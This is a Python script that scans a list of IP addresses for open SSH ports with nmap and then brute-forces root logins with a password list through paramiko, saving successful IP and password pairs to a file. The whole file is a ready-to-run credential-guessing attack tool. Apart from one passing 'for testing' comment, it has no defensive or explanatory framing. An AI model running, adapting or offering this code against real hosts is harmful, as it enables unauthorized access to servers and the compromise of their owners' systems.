import nmap
import paramiko
import socket

# File paths for input and output
target_ips_file = input("enter the Target IP file Path : ")
passwords_file = input("enter Path to Password file  : ")
open_ssh_ips_file = "open_ssh_ips.txt"
successful_logins_file = "successful_logins.txt"
ssh_port = 22  # SSH default port


# Function to load IP addresses from file
def load_ips(filename):
    with open(filename, 'r') as file:
        ips = [line.strip() for line in file.readlines()]
    return ips


# Function to load passwords from file
def load_passwords(filename):
    with open(filename, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords


# Function to scan for IPs with open SSH ports
def scan_for_open_ssh(ip_list, port):
    scanner = nmap.PortScanner()
    open_ssh_ips = []
    for ip in ip_list:
        scanner.scan(ip, str(port))
        if ip in scanner.all_hosts() and scanner[ip].has_tcp(port) and scanner[ip]['tcp'][port]['state'] == 'open':
            open_ssh_ips.append(ip)
            print(f"Found open SSH port on {ip}")

    # Save IPs with open SSH ports to a file
    with open(open_ssh_ips_file, 'w') as f:
        for ip in open_ssh_ips:
            f.write(f"{ip}\n")
    return open_ssh_ips


# Function to attempt SSH login with a list of passwords
def try_ssh_login(ip, username, password_list):
    for password in password_list:
        try:
            # Setup SSH client with paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=ssh_port, username=username, password=password, timeout=3)
            print(f"Successful login on {ip} with password: {password}")

            # Save successful login to a file
            with open(successful_logins_file, 'a') as f:
                f.write(f"IP: {ip}, Password: {password}\n")

            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Failed login on {ip} with password: {password}")
            continue
        except (socket.error, paramiko.SSHException) as e:
            print(f"Error connecting to {ip}: {e}")
            break  # Stop further attempts if unable to connect
    return False


# Main function to perform the scan and login attempts
def main():
    # Load IP addresses and passwords from files
    target_ips = load_ips(target_ips_file)
    passwords = load_passwords(passwords_file)

    print("Scanning for open SSH ports...")
    open_ssh_ips = scan_for_open_ssh(target_ips, ssh_port)

    print("Attempting SSH logins...")
    username = "root"  # Default username for testing; adjust as needed
    for ip in open_ssh_ips:
        try_ssh_login(ip, username, passwords)


if __name__ == "__main__":
    main()
